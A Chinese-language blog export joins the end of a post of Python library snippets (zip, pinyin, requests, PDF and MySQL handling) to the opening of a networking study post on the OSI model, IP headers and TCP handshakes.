<h2 id="1-数据处理"><a href="#1-数据处理" class="headerlink" title="1. 数据处理"></a>1. 数据处理</h2><p>数据处理相关(pandas、numpy等)的在<a href="/blogs/2018-10-25-dataScienceStudyPython">另一篇博客详解</a></p>
<h2 id="2-压缩"><a href="#2-压缩" class="headerlink" title="2. 压缩"></a>2. 压缩</h2><h3 id="zip格式"><a href="#zip格式" class="headerlink" title="zip格式"></a>zip格式</h3><p>创建压缩</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">z = zipfile.ZipFile(folderName + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, zipfile.ZIP_STORED) <span class="comment"># 创建文件</span></span><br><span class="line">z.write(<span class="string">&#x27;test.txt&#x27;</span>)             <span class="comment"># 写入一个文件</span></span><br><span class="line">z.write(<span class="string">&#x27;dirName&#x27;</span>)              <span class="comment"># 写入一个空文件夹</span></span><br><span class="line">z.write(<span class="string">&#x27;folderName/fileName&#x27;</span>)  <span class="comment"># 可以在没有上级目录的情况下直接写一个文件</span></span><br><span class="line">z.close()                       <span class="comment"># 关闭文件</span></span><br></pre></td></tr></table></figure>

<p>压缩目录下的所有文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">z = zipfile.ZipFile(<span class="string">&#x27;dirName.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, zipfile.ZIP_STORED)</span><br><span class="line"><span class="keyword">for</span> dirPath, dirNames, fileNames <span class="keyword">in</span> os.walk(<span class="string">&#x27;dirName&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> fileName <span class="keyword">in</span> fileNames:</span><br><span class="line">        z.write(dirPath + <span class="string">&#x27;/&#x27;</span> + fileName)</span><br><span class="line">        <span class="built_in">print</span>(dirPath + <span class="string">&#x27;/&#x27;</span> + fileName)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 防止空文件夹没有被添加入压缩文件</span></span><br><span class="line">    <span class="keyword">for</span> dirName <span class="keyword">in</span> dirNames:</span><br><span class="line">        z.write(dirPath + <span class="string">&#x27;/&#x27;</span> + dirName)</span><br><span class="line">        <span class="built_in">print</span>(dirPath + <span class="string">&#x27;/&#x27;</span> + dirName + <span class="string">&#x27;/&#x27;</span>) <span class="comment"># 区别于文件的打印</span></span><br><span class="line">z.close()</span><br></pre></td></tr></table></figure>

<h2 id="3-汉字转拼音-xpinyin"><a href="#3-汉字转拼音-xpinyin" class="headerlink" title="3. 汉字转拼音 xpinyin"></a>3. 汉字转拼音 xpinyin</h2><p>简单用例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xpinyin</span><br><span class="line">pin = xpinyin.Pinyin()</span><br><span class="line">test1 = pin.get_pinyin(<span class="string">&quot;大河向东流&quot;</span>)   <span class="comment">#默认分割符为-</span></span><br><span class="line"><span class="built_in">print</span>(test1)</span><br><span class="line"></span><br><span class="line">test2 = pin.get_pinyin(<span class="string">&quot;大河向东流&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(test2)</span><br></pre></td></tr></table></figure>

<h2 id="4-参数解析器-argparse"><a href="#4-参数解析器-argparse" class="headerlink" title="4. 参数解析器 argparse"></a>4. 参数解析器 argparse</h2><p>很方便的管理命令行参数，支持选项添加</p>
<h2 id="5-文件、文件夹对比-filecmp"><a href="#5-文件、文件夹对比-filecmp" class="headerlink" title="5. 文件、文件夹对比 filecmp"></a>5. 文件、文件夹对比 filecmp</h2><p>一个开源比较好的文件夹对比仓库: <a href="https://github.com/Pixinn/compare_folders">https://github.com/Pixinn/compare_folders</a></p>
<h2 id="6-git操作-gitpython"><a href="#6-git操作-gitpython" class="headerlink" title="6. git操作 gitpython"></a>6. git操作 gitpython</h2><h2 id="7-url请求操作-requests"><a href="#7-url请求操作-requests" class="headerlink" title="7. url请求操作 requests"></a>7. url请求操作 requests</h2><h3 id="7-1-请求基本操作"><a href="#7-1-请求基本操作" class="headerlink" title="7.1. 请求基本操作"></a>7.1. 请求基本操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭https请求打印的warning</span></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="comment"># params对应请求后面的参数 https://127.0.0.1:1234?a=1&amp;b=2</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># data对应表单数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;ab&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;cd&quot;</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># json对应body的json</span></span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&quot;abc&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;cde&quot;</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">&quot;https://127.0.0.1:1234&quot;</span>, params=params)</span><br><span class="line">r = requests.post(<span class="string">&quot;https://127.0.0.1:1234&quot;</span>, params=params, data=data, json=json_data)</span><br></pre></td></tr></table></figure>

<h3 id="7-2-下载文件"><a href="#7-2-下载文件" class="headerlink" title="7.2. 下载文件"></a>7.2. 下载文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://image.csslcloud.net/image.jpg&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">down_res = requests.get(url=url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./tmp/test.png&#x27;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> code:</span><br><span class="line">    code.write(down_res.content)</span><br></pre></td></tr></table></figure>

<h2 id="8-接口测试框架-robot-framework"><a href="#8-接口测试框架-robot-framework" class="headerlink" title="8. 接口测试框架 robot framework"></a>8. 接口测试框架 robot framework</h2><h3 id="8-1-命令使用"><a href="#8-1-命令使用" class="headerlink" title="8.1. 命令使用"></a>8.1. 命令使用</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行tag为xxx的用例</span></span><br><span class="line">robot -i xxx caseDir/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行tag为xxx的用例，日志级别为TRACE，默认显示级别INFO</span></span><br><span class="line">robot -i xxx -L TRACE:INFO caseDir/</span><br></pre></td></tr></table></figure>

<h2 id="9-浏览器自动化操作-selenium"><a href="#9-浏览器自动化操作-selenium" class="headerlink" title="9. 浏览器自动化操作 selenium"></a>9. 浏览器自动化操作 selenium</h2><p>见<a href="/blogs/2022-02-27-selenium">python selenium使用记录</a></p>
<h2 id="10-pdf编辑-PyPDF2"><a href="#10-pdf编辑-PyPDF2" class="headerlink" title="10. pdf编辑 PyPDF2"></a>10. pdf编辑 PyPDF2</h2><h3 id="10-1-删除一页pdf"><a href="#10-1-删除一页pdf" class="headerlink" title="10.1. 删除一页pdf"></a>10.1. 删除一页pdf</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PyPDF2 <span class="keyword">import</span> PdfFileWriter, PdfFileReader</span><br><span class="line"></span><br><span class="line">output = PdfFileWriter()</span><br><span class="line">input1 = PdfFileReader(<span class="built_in">open</span>(<span class="string">&quot;test.pdf&quot;</span>, <span class="string">&quot;rb&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_pdf</span>(<span class="params">index: <span class="built_in">list</span></span>):</span><br><span class="line">    pages = input1.getNumPages()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pages):</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">1</span> <span class="keyword">in</span> index:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        output.addPage(input1.getPage(i))</span><br><span class="line"></span><br><span class="line">    outputStream = <span class="built_in">open</span>(<span class="string">&quot;test1.pdf&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    output.write(outputStream)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete_pdf([<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h2 id="11-pymysql-mysql操作库"><a href="#11-pymysql-mysql操作库" class="headerlink" title="11. pymysql mysql操作库"></a>11. pymysql mysql操作库</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">mysql_conn = pymysql.connect(host=<span class="string">&#x27;1.0.2.3&#x27;</span>, port=<span class="number">3306</span>, user=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>, db=<span class="string">&#x27;web_analyze&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行sql语句</span></span><br><span class="line">sql = <span class="string">&quot;&quot;&quot;CREATE TABLE `emm_data` (</span></span><br><span class="line"><span class="string">  `id` int unsigned NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">  `path` varchar(512) COLLATE utf8mb4_bin NOT NULL,</span></span><br><span class="line"><span class="string">  `size` int unsigned NOT NULL,</span></span><br><span class="line"><span class="string">  `modify` datetime DEFAULT NULL,</span></span><br><span class="line"><span class="string">  PRIMARY KEY (`id`),</span></span><br><span class="line"><span class="string">  UNIQUE KEY `emm_data_path` (`path`)</span></span><br><span class="line"><span class="string">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> mysql_conn.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">    mysql_conn.commit()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    mysql_conn.rollback()</span><br></pre></td></tr></table></figure>


<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-判断文件是否为二进制"><a href="#1-判断文件是否为二进制" class="headerlink" title="1. 判断文件是否为二进制"></a>1. 判断文件是否为二进制</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#: BOMs to indicate that a file is a text file even if it contains zero bytes.</span></span><br><span class="line">_TEXT_BOMS = (</span><br><span class="line">    codecs.BOM_UTF16_BE,</span><br><span class="line">    codecs.BOM_UTF16_LE,</span><br><span class="line">    codecs.BOM_UTF32_BE,</span><br><span class="line">    codecs.BOM_UTF32_LE,</span><br><span class="line">    codecs.BOM_UTF8,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_binary_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    file_path = os.path.abspath(file_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        initial_bytes = file.read(<span class="number">8192</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">any</span>(initial_bytes.startswith(bom) <span class="keyword">for</span> bom <span class="keyword">in</span> _TEXT_BOMS) <span class="keyword">and</span> <span class="string">b&#x27;\0&#x27;</span> <span class="keyword">in</span> initial_bytes</span><br></pre></td></tr></table></figure>

<h2 id="2-动态添加PYTHONPATH"><a href="#2-动态添加PYTHONPATH" class="headerlink" title="2. 动态添加PYTHONPATH"></a>2. 动态添加PYTHONPATH</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&#x27;/xxx/xxx&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="3-跨平台文件操作需要确定编码"><a href="#3-跨平台文件操作需要确定编码" class="headerlink" title="3. 跨平台文件操作需要确定编码"></a>3. 跨平台文件操作需要确定编码</h2><ul>
<li>windows的默认编码是gbk，如果是写文件，确定是utf8的一定要在open的时候确定是utf8编码</li>
</ul>
<h2 id="4-pip升级后运行失败"><a href="#4-pip升级后运行失败" class="headerlink" title="4. pip升级后运行失败"></a>4. pip升级后运行失败</h2><p>apt安装的pip一般只有8.1版本，而最新已经有19.1版本了，所以安装后使用pip自己更新自己</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install -U pip</span><br></pre></td></tr></table></figure>

<p>更新后执行<code>pip -V</code>会报错，因为老的pip文件api和新的没对上，需要修改<code>/usr/bin/pip</code>如下，主要是<code>main</code>需要换成<code>__main__</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># GENERATED BY DEBIAN</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run the main entry point, similarly to how setuptools does it, but because</span></span><br><span class="line"><span class="comment"># we didn&#x27;t install the actual entry point from setup.py, don&#x27;t use the</span></span><br><span class="line"><span class="comment"># pkg_resources API.</span></span><br><span class="line"><span class="keyword">from</span> pip <span class="keyword">import</span> __main__</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sys.exit(__main__._main())</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络学习</title>
    <url>/blogs/2018-09-28-computerNetworkStudy/</url>
    <content><![CDATA[<h1 id="一、网络OSI七层模型"><a href="#一、网络OSI七层模型" class="headerlink" title="一、网络OSI七层模型"></a>一、网络OSI七层模型</h1><img src = "2018_09_28_01.jpg" width = "80%" />

<h2 id="分层介绍"><a href="#分层介绍" class="headerlink" title="分层介绍"></a>分层介绍</h2><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><ul>
<li>网络服务与最终用户的一个接口。</li>
<li>协议有: HTTP FTP TFTP SMTP SNMP DNS TELNET HTTPS POP3 DHCP</li>
</ul>
<h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><ul>
<li>数据的表示、安全、压缩。（在五层模型里面已经合并到了应用层）</li>
<li>格式有，JPEG、ASCll、DECOIC、加密格式等</li>
</ul>
<h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><ul>
<li>建立、管理、终止会话。（在五层模型里面已经合并到了应用层）</li>
<li>对应主机进程，指本地主机与远程主机正在进行的会话</li>
</ul>
<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><ul>
<li>定义传输数据的协议端口号，以及流控和差错校验。</li>
<li>协议有: TCP UDP，数据包一旦离开网卡即进入网络传输层</li>
</ul>
<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><ul>
<li>进行逻辑地址寻址，实现不同网络之间的路径选择。ip包传输，不带端口。</li>
<li>协议有: ICMP IGMP IP（IPV4 IPV6） ARP RARP</li>
</ul>
<h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><ul>
<li>建立逻辑连接、进行硬件地址寻址、差错校验 [2]  等功能。（由底层网络定义协议）</li>
<li>将比特组合成字节进而组合成帧，用MAC地址访问介质，错误发现但不能纠正。</li>
</ul>
<h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><ul>
<li>建立、维护、断开物理连接。（由底层网络定义协议）</li>
</ul>
<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><ul>
<li>TCP&#x2F;IP 层级模型结构，应用层之间的协议通过逐级调用传输层（Transport layer）、网络层（Network Layer）和物理数据链路层（Physical Data Link）而可以实现应用层的应用程序通信互联。</li>
<li>应用层需要关心应用程序的逻辑细节，而不是数据在网络中的传输活动。应用层其下三层则处理真正的通信细节。在 Internet 整个发展过程中的所有思想和着重点都以一种称为 RFC（Request For Comments）的文档格式存在。针对每一种特定的 TCP&#x2F;IP 应用，有相应的 RFC [3]  文档。</li>
<li>一些典型的 TCP&#x2F;IP 应用有 FTP、Telnet、SMTP、SNTP、REXEC、TFTP、LPD、SNMP、NFS、INETD 等。RFC 使一些基本相同的 TCP&#x2F;IP 应用程序实现了标准化，从而使得不同厂家开发的应用程序可以互相通信</li>
</ul>
<h1 id="二、网络层"><a href="#二、网络层" class="headerlink" title="二、网络层"></a>二、网络层</h1><h2 id="1-ip地址分类"><a href="#1-ip地址分类" class="headerlink" title="1. ip地址分类"></a>1. ip地址分类</h2><img src="2019_10_14_02.png" width="80%" />

<p>IP地址根据网络号和主机号来分，分为A、B、C三类及特殊地址D、E。全0和全1的都保留不用。</p>
<ul>
<li>A类: (1.0.0.0-126.0.0.0)（默认子网掩码: 255.0.0.0或 0xFF000000）第一个字节为网络号，后三个字节为主机号。该类IP地址的最前面为“0”，所以地址的网络号取值于1~126之间。一般用于大型网络。</li>
<li>B类: (128.0.0.0-191.255.0.0)（默认子网掩码: 255.255.0.0或0xFFFF0000）前两个字节为网络号，后两个字节为主机号。该类IP地址的最前面为“10”，所以地址的网络号取值于128~191之间。一般用于中等规模网络。</li>
<li>C类: (192.0.0.0-223.255.255.0)（子网掩码: 255.255.255.0或 0xFFFFFF00）前三个字节为网络号，最后一个字节为主机号。该类IP地址的最前面为“110”，所以地址的网络号取值于192~223之间。一般用于小型网络。</li>
<li>D类: 是多播地址。该类IP地址的最前面为“1110”，所以地址的网络号取值于224~239之间。一般用于多路广播用户[1]  。</li>
<li>E类: 是保留地址。该类IP地址的最前面为“1111”，所以地址的网络号取值于240~255之间。</li>
</ul>
<h2 id="2-ip包分析"><a href="#2-ip包分析" class="headerlink" title="2. ip包分析"></a>2. ip包分析</h2><h3 id="2-1-ipv4包"><a href="#2-1-ipv4包" class="headerlink" title="2.1. ipv4包"></a>2.1. ipv4包</h3><p><strong>结构图</strong></p>
<img src="2022-03-15-03.png" />

<p><strong>协议头文件定义</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// netinet/ip.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">iphdr</span></span><br><span class="line">  &#123;</span><br><span class="line"><span class="comment">// 主机字节序是小端，就在第一个字节后4位</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __BYTE_ORDER == __LITTLE_ENDIAN</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ihl:<span class="number">4</span>;         <span class="comment">// 0:0-3</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> version:<span class="number">4</span>;     <span class="comment">// 0:4-7</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> __BYTE_ORDER == __BIG_ENDIAN</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> version:<span class="number">4</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ihl:<span class="number">4</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span>	<span class="string">&quot;Please fix &lt;bits/endian.h&gt;&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">uint8_t</span> tos;        <span class="comment">// 1</span></span><br><span class="line">    <span class="type">uint16_t</span> tot_len;   <span class="comment">// 2-3</span></span><br><span class="line">    <span class="type">uint16_t</span> id;        <span class="comment">// 4-5</span></span><br><span class="line">    <span class="type">uint16_t</span> frag_off;  <span class="comment">// 6-7</span></span><br><span class="line">    <span class="type">uint8_t</span> ttl;        <span class="comment">// 8</span></span><br><span class="line">    <span class="type">uint8_t</span> protocol;   <span class="comment">// 9</span></span><br><span class="line">    <span class="type">uint16_t</span> check;     <span class="comment">// 10-11</span></span><br><span class="line">    <span class="type">uint32_t</span> saddr;     <span class="comment">// 12-15</span></span><br><span class="line">    <span class="type">uint32_t</span> daddr;     <span class="comment">// 16-19</span></span><br><span class="line">    <span class="comment">/*The options start here. */</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面是__USE_MISC定义的</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ip</span></span><br><span class="line">  &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __BYTE_ORDER == __LITTLE_ENDIAN</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ip_hl:<span class="number">4</span>;		<span class="comment">/* header length */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ip_v:<span class="number">4</span>;		<span class="comment">/* version */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __BYTE_ORDER == __BIG_ENDIAN</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ip_v:<span class="number">4</span>;		<span class="comment">/* version */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ip_hl:<span class="number">4</span>;		<span class="comment">/* header length */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">uint8_t</span> ip_tos;			<span class="comment">/* type of service */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> ip_len;		<span class="comment">/* total length */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> ip_id;		<span class="comment">/* identification */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> ip_off;		<span class="comment">/* fragment offset field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IP_RF 0x8000			<span class="comment">/* reserved fragment flag */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IP_DF 0x4000			<span class="comment">/* dont fragment flag */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IP_MF 0x2000			<span class="comment">/* more fragments flag */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IP_OFFMASK 0x1fff		<span class="comment">/* mask for fragmenting bits */</span></span></span><br><span class="line">    <span class="type">uint8_t</span> ip_ttl;			<span class="comment">/* time to live */</span></span><br><span class="line">    <span class="type">uint8_t</span> ip_p;			<span class="comment">/* protocol */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> ip_sum;		<span class="comment">/* checksum */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> ip_src, ip_dst;	<span class="comment">/* source and dest address */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>正好20个字节</li>
</ul>
<p><strong>详细介绍</strong></p>
<ul>
<li>ihl: ip包头部长度，包括拓展字段长度</li>
<li>version: 标识ipv4还是ipv6</li>
<li>tos: 服务类型，只有在区分服务的时候才会用</li>
<li>tot_len: ip包总长度</li>
<li>id: 标识数据包的计数，每一个包，计数加一；分片包此数字一样</li>
<li>frag_off: 分片包相关标记<ul>
<li><code>0x8000</code>: 保留未使用</li>
<li><code>0x4000</code>: 不分片的flag，分片就是0，不分片为1</li>
<li><code>0x2000</code>: 是否后面还有分片包的标志位</li>
<li><code>0x1fff</code>: 标识分片包顺序的标志位</li>
</ul>
</li>
<li>ttl: 生存时间，经过每个路由器，TTL减去消耗的时间，当TTL为0，丢掉此数据包</li>
<li>protocol: 标识协议类型，TCP、UDP、ICMP等，具体定义在<code>netinet/in.h</code>里面</li>
<li>check: ip头校验和</li>
<li>saddr: 源地址</li>
<li>daddr: 目标地址</li>
</ul>
<h3 id="2-2-ipv6包"><a href="#2-2-ipv6包" class="headerlink" title="2.2. ipv6包"></a>2.2. ipv6包</h3><p><strong>结构图</strong></p>
<img src="2022-03-29-04.png" />

<p><strong>wireshark抓包</strong></p>
<img src="2022-03-29-05.png" />

<p><strong>协议头文件定义</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// netinet/ip6.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ip6_hdr</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">      &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ip6_hdrctl</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">uint32_t</span> ip6_un1_flow;   <span class="comment">/* 4 bits version, 8 bits TC,</span></span><br><span class="line"><span class="comment">                    20 bits flow-ID */</span></span><br><span class="line">        <span class="type">uint16_t</span> ip6_un1_plen;   <span class="comment">/* payload length */</span></span><br><span class="line">        <span class="type">uint8_t</span>  ip6_un1_nxt;    <span class="comment">/* next header */</span></span><br><span class="line">        <span class="type">uint8_t</span>  ip6_un1_hlim;   <span class="comment">/* hop limit */</span></span><br><span class="line">      &#125; ip6_un1;</span><br><span class="line">    <span class="type">uint8_t</span> ip6_un2_vfc;       <span class="comment">/* 4 bits version, top 4 bits tclass */</span></span><br><span class="line">      &#125; ip6_ctlun;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in6_addr</span> ip6_src;      <span class="comment">/* source address */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in6_addr</span> ip6_dst;      <span class="comment">/* destination address */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p><strong>详细介绍</strong></p>
<ul>
<li><code>version</code>: 前4bit，ipv6就只有6</li>
<li><code>Traffic Class</code>: 紧跟的8bit</li>
<li><code>ip6_un1_plen</code>: 应用数据包大小（不算ip头）</li>
<li><code>ip6_un1_nxt</code>: 协议（UDP、TCP等）</li>
<li><code>ip6_src</code>: 64bit源地址</li>
<li><code>ip6_dst</code>: 64bit目的地址</li>
</ul>
<h1 id="三、传输层"><a href="#三、传输层" class="headerlink" title="三、传输层"></a>三、传输层</h1><ul>
<li>tcp和udp都是ip包的数据段，分片包协议属于ip网络层协议，非传输层</li>
</ul>
<h2 id="1-TCP"><a href="#1-TCP" class="headerlink" title="1. TCP"></a>1. TCP</h2><h3 id="1-1-建立TCP连接-三次握手协议"><a href="#1-1-建立TCP连接-三次握手协议" class="headerlink" title="1.1. 建立TCP连接: 三次握手协议"></a>1.1. 建立TCP连接: 三次握手协议</h3><ul>
<li>客户端: 我要对你讲话，你能听到吗；</li>
<li>服务端: 我能听到；而且我也要对你讲话，你能听到吗；</li>
<li>客户端: 我也能听到。<br>…<br>互相开始通话<br>…</li>
</ul>
<h3 id="1-2-关闭TCP连接-四次握手协议"><a href="#1-2-关闭TCP连接-四次握手协议" class="headerlink" title="1.2. 关闭TCP连接: 四次握手协议"></a>1.2. 关闭TCP连接: 四次握手协议</h3><ul>
<li>客户端: 我说完了，我要闭嘴了；</li>
<li>服务端: 我收到请求，我要闭耳朵了；<br>（客户端收到这个确认，于是安心地闭嘴了。）<br>…<br>服务端还没倾诉完自己的故事，于是继续唠唠叨叨向客户端说了半天，直到说完为止<br>…</li>
<li>服务端: 我说完了，我也要闭嘴了；</li>
<li>客户端: 我收到请求，我要闭耳朵了；（事实上，客户端为了保证这个确认包成功送达，等待了两个最大报文生命周期后，才闭上耳朵。）<br>（服务端收到这个确认，于是安心地闭嘴了。）</li>
</ul>
<h4 id="1-问题"><a href="#1-问题" class="headerlink" title="1) 问题"></a>1) 问题</h4><ol>
<li>客户端收到请求包后，为什么要等待两个最大报文生命周期后，才闭上耳朵呢？<ul>
<li>为了以防万一，因为最后一个发往服务端B的确认包有可能丢失。若丢失，服务端这里过了响应超时时间timeOut，会再次往客户端A发送关闭连接请求，这时候客户端得保证自己还没闭上耳朵，还能接收请求才行。</li>
<li>服务端B再次发送的请求包到达客户端A时间，绝不会超过最大报文生命周期。</li>
<li>这里的问题是，到底上面服务端的是如何判断超时的（我不是很清楚），假如是以自己发送请求时刻开始计时，半天未应答，为超时，那么：</li>
<li>从服务端B发送请求包的时刻开始算，经过( TimeOut + 最大报文生命周期 )后，A必须还能接收数据包。</li>
<li>那么A需要等待的时间是: ( TimeOut + 最大报文生命周期 ) - （上一个关闭l请求包从B发送到A的时长）。</li>
<li>网上这块儿都讲得很模糊，一般就是说到A需要等待( TimeOut + 最大报文生命周期 ) &lt; 2 * 最大报文生命周期，所以等待2 * 最大报文生命周期可以确保万无一失。</li>
<li>事实上，这里关键需要搞清楚服务端的是如何判断超时的，我不是很清楚。但是假如是以自己发送请求的时刻开始计时，那么TimeOut应该是一个往返的最大时间吧，你们确定一个“请求-应答”往返的最大时间小于最大报文生命周期。</li>
<li>当然，所有地方都是说要等待 2 * 最大生命周期，虽然没具体搞明白，但是我也同样相信。只是，网上的各种解释，都解析的模模糊糊，而且好多地方从逻辑上都不能完全说通诶，对那些解释，我没法完全相信。</li>
</ul>
</li>
</ol>
